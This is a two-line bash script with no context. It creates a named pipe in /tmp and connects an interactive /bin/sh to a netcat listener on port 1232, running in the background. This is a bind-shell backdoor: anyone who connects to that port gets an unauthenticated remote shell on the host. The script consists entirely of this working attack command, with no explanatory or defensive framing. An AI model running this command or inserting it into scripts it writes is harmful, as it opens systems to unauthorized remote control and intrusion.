#!/bin/bash
mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc -l 1232 >/tmp/f &

